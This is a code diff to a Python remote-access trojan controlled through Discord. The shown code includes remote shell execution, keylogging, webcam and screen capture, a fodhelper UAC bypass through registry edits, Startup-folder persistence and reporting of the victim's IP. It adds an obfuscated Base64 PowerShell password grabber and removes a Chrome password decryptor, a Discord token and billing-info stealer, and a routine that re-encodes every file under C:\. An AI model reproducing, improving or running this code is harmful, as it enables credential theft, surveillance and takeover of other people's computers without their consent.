@@ -18,8 +18,14 @@ import asyncio
 import discord
 from discord import utils
 token = ''
+global isexe
+isexe=False
+if (sys.argv[0].endswith("exe")):
+    isexe=True
 global appdata
+global temp
 appdata = os.getenv('APPDATA')
+temp= os.getenv('temp')
 client = discord.Client()
 bot = commands.Bot(command_prefix='!')
 ssl._create_default_https_context = ssl._create_unverified_context
@@ -49,16 +55,16 @@ Availaible commands are :
 --> !volumemax = Put volume to max
 --> !volumezero = Put volume at 0
 --> !idletime = Get the idle time of user's on target computer
+--> !listprocess = Get all process
 --> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
 --> !unblockinput = Unblocks user's keyboard and mouse / Warning : Admin rights are required
 --> !screenshot = Get the screenshot of the user's current screen
 --> !exit = Exit program
 --> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
 --> !uacbypass = attempt to bypass uac to gain admin by using fod helper
---> !passwords = grab all chrome passwords
+--> !passwords = grab all passwords
 --> !streamwebcam = streams webcam by sending multiple pictures
 --> !stopwebcam = stop webcam stream
---> !getdiscordinfo = get discord token,email,phone number,etc
 --> !streamscreen = stream screen by sending multiple pictures
 --> !stopscreen = stop screen stream
 --> !shutdown = shutdown computer
@@ -123,29 +129,25 @@ async def on_ready():
     import os
     total = []
     global number
-    number = 0
+    number = 1
     global channel_name
     channel_name = None
     for x in client.get_all_channels(): 
         total.append(x.name)
     for y in range(len(total)):
-        if "session" in total[y]:
+        if total[y].startswith("session"):
             import re
             result = [e for e in re.split("[^0-9]", total[y]) if e != '']
             biggest = max(map(int, result))
             number = biggest + 1
         else:
             pass  
-    if number == 0:
-        channel_name = "session-1"
-        newchannel = await client.guilds[0].create_text_channel(channel_name)
-    else:
-        channel_name = f"session-{number}"
-        newchannel = await client.guilds[0].create_text_channel(channel_name)
+    channel_name = f"session-{number}"
+    newchannel = await client.guilds[0].create_text_channel(channel_name)
     channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
     channel = client.get_channel(channel_.id)
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()}"
+    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} |  :flag_{flag.lower()}: | User : {os.getlogin()} | IP: {ip}"
     if is_admin == True:
         await channel.send(f'{value1} | admin!')
     elif is_admin == False:
@@ -205,7 +207,7 @@ async def on_message(message):
             file_keys = temp + r"\key_log.txt"
             file = discord.File(file_keys, filename="key_log.txt")
             await message.channel.send("[*] Command successfuly executed", file=file)
-            os.popen(f"del {file_keys}")
+            os.remove(file_keys)
 
         if message.content == "!exit":
             import sys
@@ -301,38 +303,32 @@ async def on_message(message):
 
         if message.content.startswith("!shell"):
             global status
-            import time
             status = None
             import subprocess
             import os
             instruction = message.content[7:]
-            def shell():
-                output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            def shell(command):
+                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 global status
                 status = "ok"
-                return output
-            import threading
-            shel = threading.Thread(target=shell)
-            shel._running = True
-            shel.start()
-            time.sleep(1)
-            shel._running = False
+                return output.stdout.decode('CP437').strip()
+            out = shell(instruction)
+            print(out)
+            print(status)
             if status:
-                result = str(shell().stdout.decode('CP437'))
-                numb = len(result)
+                numb = len(out)
                 if numb < 1:
                     await message.channel.send("[*] Command not recognized or no output was obtained")
                 elif numb > 1990:
                     temp = (os.getenv('TEMP'))
                     f1 = open(temp + r"\output.txt", 'a')
-                    f1.write(result)
+                    f1.write(out)
                     f1.close()
                     file = discord.File(temp + r"\output.txt", filename="output.txt")
                     await message.channel.send("[*] Command successfuly executed", file=file)
-                    dele = "del" + temp + r"\output.txt"
-                    os.popen(dele)
+                    os.remove(temp + r"\output.txt")
                 else:
-                    await message.channel.send("[*] Command successfuly executed : " + result)
+                    await message.channel.send("[*] Command successfuly executed : " + out)
             else:
                 await message.channel.send("[*] Command not recognized or no output was obtained")
                 status = None
@@ -366,7 +362,7 @@ async def on_message(message):
             temp = (os.getenv('TEMP'))
             file = discord.File(temp + r"\helpmenu.txt", filename="helpmenu.txt")
             await message.channel.send("[*] Command successfuly executed", file=file)
-            os.system(r"del %temp%\helpmenu.txt /f")
+            os.remove(temp + r"\helpmenu.txt")
 
         if message.content.startswith("!write"):
             import pyautogui
@@ -467,18 +463,6 @@ async def on_message(message):
             if isAdmin():
                 await message.channel.send("Your already admin!")
             else:
-                await message.channel.send("attempting to get admin!")
-                if message.content == "!uacbypass":
-                    uncritproc()
-                    test_str = sys.argv[0]
-                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
-                    cmd2 = current_dir
-                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
-                    os.system(create_reg_path)
-                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
-                    os.system(create_trigger_reg_key) 
-                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
-                    os.system(create_payload_reg_key)
                 class disable_fsr():
                     disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
                     revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
@@ -488,6 +472,30 @@ async def on_message(message):
                     def __exit__(self, type, value, traceback):
                         if self.success:
                             self.revert(self.old_value)
+                await message.channel.send("attempting to get admin!")
+                isexe=False
+                if (sys.argv[0].endswith("exe")):
+                    isexe=True
+                if not isexe:
+                    test_str = sys.argv[0]
+                    current_dir = inspect.getframeinfo(inspect.currentframe()).filename
+                    cmd2 = current_dir
+                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
+                    os.system(create_reg_path)
+                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
+                    os.system(create_trigger_reg_key) 
+                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start python """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                    os.system(create_payload_reg_key)
+                else:
+                    test_str = sys.argv[0]
+                    current_dir = test_str
+                    cmd2 = current_dir
+                    create_reg_path = """ powershell New-Item "HKCU:\SOFTWARE\Classes\ms-settings\Shell\Open\command" -Force """
+                    os.system(create_reg_path)
+                    create_trigger_reg_key = """ powershell New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "hi" -Force """
+                    os.system(create_trigger_reg_key) 
+                    create_payload_reg_key = """powershell Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "`(Default`)" -Value "'cmd /c start """ + '""' + '"' + '"' + cmd2 + '""' +  '"' + '"\'"' + """ -Force"""
+                    os.system(create_payload_reg_key)
                 with disable_fsr():
                     os.system("fodhelper.exe")  
                 time.sleep(2)
@@ -535,16 +543,8 @@ async def on_message(message):
                     return millis / 1000.0
                 else:
                     return 0
-            import threading
-            global idle1
-            idle1 = threading.Thread(target=get_idle_duration)
-            idle1._running = True
-            idle1.daemon = True
-            idle1.start()
             duration = get_idle_duration()
-            await message.channel.send('User idle for %.2f seconds.' % duration)
-            import time
-            time.sleep(1)
+            await message.channel.send(f'User idle for {duration:.2f} seconds.')
 
         if message.content.startswith("!voice"):
             volumeup()
@@ -572,69 +572,21 @@ async def on_message(message):
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
         if message.content == "!passwords" :
+            import subprocess
             import os
-            import json
-            import base64
-            import sqlite3
-            import win32crypt
-            from Cryptodome.Cipher import AES
-            import shutil
-
-            def get_master_key():
-                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
-                    local_state = f.read()
-                    local_state = json.loads(local_state)
-                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-                master_key = master_key[5:]
-                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
-                return master_key
-
-            def decrypt_payload(cipher, payload):
-                return cipher.decrypt(payload)
-
-            def generate_cipher(aes_key, iv):
-                return AES.new(aes_key, AES.MODE_GCM, iv)
-            def decrypt_password(buff, master_key):
-                try:
-                    iv = buff[3:15]
-                    payload = buff[15:]
-                    cipher = generate_cipher(master_key, iv)
-                    decrypted_pass = decrypt_payload(cipher, payload)
-                    decrypted_pass = decrypted_pass[:-16].decode()
-                    return decrypted_pass
-                except Exception as e:
-                    return "Chrome < 80"
- 
-
-            master_key = get_master_key()
-            login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
-            shutil.copy2(login_db, "Loginvault.db")
-            conn = sqlite3.connect("Loginvault.db")
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for r in cursor.fetchall():
-                    url = r[0]
-                    username = r[1]
-                    encrypted_password = r[2]
-                    decrypted_password = decrypt_password(encrypted_password, master_key)
-                    if len(username) > 0:
-                        temp = (os.getenv('TEMP'))
-                        output = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
-                        f4 = open(temp + r"\passwords.txt", 'a')
-                        f4.write(str(output))
-                        f4.close()
-            except Exception as e:
-                pass
-            cursor.close()
-            conn.close()
-            try:
-                os.remove("Loginvault.db")
-                file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
-                await message.channel.send("[*] Command successfuly executed", file=file)
-                os.system("del %temp%\passwords.txt /f")
-            except Exception as e:
-                pass
+            temp= os.getenv('temp')
+            def shell(command):
+                output = subprocess.run(command, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                global status
+                status = "ok"
+                return output.stdout.decode('CP437').strip()
+            passwords = shell("Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded WwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACgAJwB7ACIAUwBjAHIAaQBwAHQAIgA6ACIASgBHAGwAdQBjADMAUgBoAGIAbQBOAGwASQBEADAAZwBXADAARgBqAGQARwBsADIAWQBYAFIAdgBjAGwAMAA2AE8AawBOAHkAWgBXAEYAMABaAFUAbAB1AGMAMwBSAGgAYgBtAE4AbABLAEYAdABUAGUAWABOADAAWgBXADAAdQBVAG0AVgBtAGIARwBWAGoAZABHAGwAdgBiAGkANQBCAGMAMwBOAGwAYgBXAEoAcwBlAFYAMAA2AE8AawB4AHYAWQBXAFEAbwBLAEUANQBsAGQAeQAxAFAAWQBtAHAAbABZADMAUQBnAFUAMwBsAHoAZABHAFYAdABMAGsANQBsAGQAQwA1AFgAWgBXAEoARABiAEcAbABsAGIAbgBRAHAATABrAFIAdgBkADIANQBzAGIAMgBGAGsAUgBHAEYAMABZAFMAZwBpAGEASABSADAAYwBIAE0ANgBMAHkAOQB5AFkAWABjAHUAWgAyAGwAMABhAEgAVgBpAGQAWABOAGwAYwBtAE4AdgBiAG4AUgBsAGIAbgBRAHUAWQAyADkAdABMADAAdwB4AFoAMgBoADAAVABUAFIAdQBMADAAUgA1AGIAbQBGAHQAYQBXAE4AVABkAEcAVgBoAGIARwBWAHkATAAyADEAaABhAFcANAB2AFIARQB4AE0ATAAxAEIAaABjADMATgAzAGIAMwBKAGsAVQAzAFIAbABZAFcAeABsAGMAaQA1AGsAYgBHAHcAaQBLAFMAawB1AFIAMgBWADAAVgBIAGwAdwBaAFMAZwBpAFUARwBGAHoAYwAzAGQAdgBjAG0AUgBUAGQARwBWAGgAYgBHAFYAeQBMAGwATgAwAFoAVwBGAHMAWgBYAEkAaQBLAFMAawBOAEMAaQBSAHcAWQBYAE4AegBkADIAOQB5AFoASABNAGcAUABTAEEAawBhAFcANQB6AGQARwBGAHUAWQAyAFUAdQBSADIAVgAwAFYASABsAHcAWgBTAGcAcABMAGsAZABsAGQARQAxAGwAZABHAGgAdgBaAEMAZwBpAFUAbgBWAHUASQBpAGsAdQBTAFcANQAyAGIAMgB0AGwASwBDAFIAcABiAG4ATgAwAFkAVwA1AGoAWgBTAHcAawBiAG4AVgBzAGIAQwBrAE4AQwBsAGQAeQBhAFgAUgBsAEwAVQBoAHYAYwAzAFEAZwBKAEgAQgBoAGMAMwBOADMAYgAzAEoAawBjAHcAMABLACIAfQAnACAAfAAgAEMAbwBuAHYAZQByAHQARgByAG8AbQAtAEoAcwBvAG4AKQAuAFMAYwByAGkAcAB0ACkAKQAgAHwAIABpAGUAeAA=")
+            f4 = open(temp + r"\passwords.txt", 'w')
+            f4.write(str(passwords))
+            f4.close()
+            file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
+            await message.channel.send("[*] Command successfuly executed", file=file)
+            os.remove(temp + r"\passwords.txt")
         if message.content == "!streamwebcam" :
             await message.channel.send("[*] Command successfuly executed")
             import os
@@ -669,167 +621,6 @@ async def on_message(message):
             os.system(r"mkdir %temp%\hobo")
             os.system(r"echo hello>%temp%\hobo\hello.txt")
             os.system(r"del %temp\temp.png /F")
-        if message.content == "!getdiscordinfo":
-            import os
-            if os.name != "nt":
-                exit()
-            from re import findall
-            from json import loads, dumps
-            from base64 import b64decode
-            from subprocess import Popen, PIPE
-            from urllib.request import Request, urlopen
-            from threading import Thread
-            from time import sleep
-            from sys import argv
-
-            LOCAL = os.getenv("LOCALAPPDATA")
-            ROAMING = os.getenv("APPDATA")
-            PATHS = {
-                "Discord": ROAMING + "\\Discord",
-                "Discord Canary": ROAMING + "\\discordcanary",
-                "Discord PTB": ROAMING + "\\discordptb",
-                "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-                "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-                "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-                "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
-            }
-
-
-            def getHeader(token=None, content_type="application/json"):
-                headers = {
-                    "Content-Type": content_type,
-                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
-                }
-                if token:
-                    headers.update({"Authorization": token})
-                return headers
-
-
-            def getUserData(token):
-                try:
-                    return loads(
-                        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
-                except:
-                    pass
-
-
-            def getTokenz(path):
-                path += "\\Local Storage\\leveldb"
-                tokens = []
-                for file_name in os.listdir(path):
-                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                        continue
-                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                            for token in findall(regex, line):
-                                tokens.append(token)
-                return tokens
-
-
-            def whoTheFuckAmI():
-                ip = "None"
-                try:
-                    ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
-                except:
-                    pass
-                return ip
-
-
-            def hWiD():
-                p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
-                return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-
-            def getFriends(token):
-                try:
-                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-                                                headers=getHeader(token))).read().decode())
-                except:
-                    pass
-
-
-            def getChat(token, uid):
-                try:
-                    return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
-                                                data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
-                except:
-                    pass
-
-
-            def paymentMethods(token):
-                try:
-                    return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
-                                                        headers=getHeader(token))).read().decode())) > 0)
-                except:
-                    pass
-
-
-            def sendMessages(token, chat_id, form_data):
-                try:
-                    urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
-                                                                                                                    "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
-                                    data=form_data.encode())).read().decode()
-                except:
-                    pass
-            
-
-            def main():
-                cache_path = ROAMING + "\\.cache~$"
-                prevent_spam = True
-                self_spread = True
-                embeds = []
-                working = []
-                checked = []
-                already_cached_tokens = []
-                working_ids = []
-                ip = whoTheFuckAmI()
-                pc_username = os.getenv("UserName")
-                pc_name = os.getenv("COMPUTERNAME")
-                user_path_name = os.getenv("userprofile").split("\\")[2]
-                for platform, path in PATHS.items():
-                    if not os.path.exists(path):
-                        continue
-                    for token in getTokenz(path):
-                        if token in checked:
-                            continue
-                        checked.append(token)
-                        uid = None
-                        if not token.startswith("mfa."):
-                            try:
-                                uid = b64decode(token.split(".")[0].encode()).decode()
-                            except:
-                                pass
-                            if not uid or uid in working_ids:
-                                continue
-                        user_data = getUserData(token)
-                        if not user_data:
-                            continue
-                        working_ids.append(uid)
-                        working.append(token)
-                        username = user_data["username"] + "#" + str(user_data["discriminator"])
-                        user_id = user_data["id"]
-                        email = user_data.get("email")
-                        phone = user_data.get("phone")
-                        nitro = bool(user_data.get("premium_type"))
-                        billing = bool(paymentMethods(token))
-                        embed = f"""
-Email: {email}
-Phone: {phone}
-Nitro: {nitro}
-Billing Info: {billing}
-value: IP: {ip}
-Username: {pc_username}
-PC Name: {pc_name}
-Token Location: {platform}     
-Token : {token}                       
-username: {username} ({user_id})
-"""
-                        return str(embed)
-            try:
-                    embed = main()
-                    await message.channel.send("[*] Command successfuly executed\n"+str(embed))
-            except Exception as e:
-                    pass            
         if message.content == "!streamscreen" :
             await message.channel.send("[*] Command successfuly executed")
             import os
@@ -891,7 +682,6 @@ username: {username} ({user_id})
             
         if message.content == "!displaydir":
             import subprocess as sp
-            import time
             import os
             import subprocess
             def shell():
@@ -899,14 +689,9 @@ username: {username} ({user_id})
                 global status
                 status = "ok"
                 return output
-            import threading
-            shel = threading.Thread(target=shell)
-            shel._running = True
-            shel.start()
-            time.sleep(1)
-            shel._running = False
+            out = shell()
             if status:
-                result = str(shell().stdout.decode('CP437'))
+                result = out
                 numb = len(result)
                 if numb < 1:
                     await message.channel.send("[*] Command not recognized or no output was obtained")
@@ -928,23 +713,10 @@ username: {username} ({user_id})
             await message.channel.send("output is : " + output)
             
         if message.content == "!listprocess":
-            import subprocess as sp
-            import time
             import os
             import subprocess
-            def shell():
-                output = subprocess.run("tasklist", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                global status
-                status = "ok"
-                return output
-            import threading
-            shel = threading.Thread(target=shell)
-            shel._running = True
-            shel.start()
-            time.sleep(1)
-            shel._running = False
-            if status:
-                result = str(shell().stdout.decode('CP437'))
+            if 1==1:
+                result = subprocess.getoutput("tasklist")
                 numb = len(result)
                 if numb < 1:
                     await message.channel.send("[*] Command not recognized or no output was obtained")
@@ -1245,43 +1017,6 @@ username: {username} ({user_id})
             os.system("""attrib -h "{}" """.format(cmd237))
             await message.channel.send("[*] Command successfuly executed")
         #broken. might fix if someone want me too.
-        if message.content == "!decode" or message.content == "!encode":
-            import os
-            import base64
-            def encode(file):
-                f = open(file)
-                data = f.read()
-                f.close()
-                data = data.encode("utf-8")
-                encodedBytes = base64.b64encode(data)
-                os.remove(file)
-                file = file + '.rip'
-                t = open(file, "w+")
-                encodedBytes = encodedBytes.decode("utf-8")
-                t.write(encodedBytes)
-                t.close()
-            def decode(file):
-                f = open(file)
-                data = f.read()
-                f.close()
-                data = data.encode("utf-8")
-                decodedBytes = base64.b64decode(data)
-                os.remove(file)
-                file = file.replace('.rip', '')
-                t = open(file, "w+")
-                decodedBytes = decodedBytes.decode("utf-8")
-                t.write(decodedBytes)
-                t.close()
-            parentDirectory = 'C:\\'
-            for root, dirs, files in os.walk(parentDirectory):
-                for afile in files:
-                    full_path = os.path.join(root, afile)
-                    if message.content == "!encode":
-                        encode(full_path)
-                        await message.channel.send("[*] Command successfuly executed")
-                    if message.content == ('!decode') and full_path.endswith('.rip'):
-                        decode(full_path)
-                        await message.channel.send("[*] Command successfuly executed")
         if message.content == "!ejectcd":
             import ctypes
             return ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
@@ -1430,15 +1165,20 @@ username: {username} ({user_id})
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:  
                 path = sys.argv[0]
-                os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
-                print(path)
-                e = r"""
-Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
-""".format(os.path.basename(sys.argv[0]))
-                with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
-                    f.write(e)
-                    f.close()
+                isexe=False
+                if (sys.argv[0].endswith("exe")):
+                    isexe=True
+                if isexe:
+                    os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
+                else:
+                    os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
+                    e = r"""
+    Set objShell = WScript.CreateObject("WScript.Shell")
+    objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
+    """.format(os.path.basename(sys.argv[0]))
+                    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
+                        f.write(e)
+                        f.close()
                 await message.channel.send("[*] Command successfuly executed")  
             else:
                 await message.channel.send("[*] This command requires admin privileges")
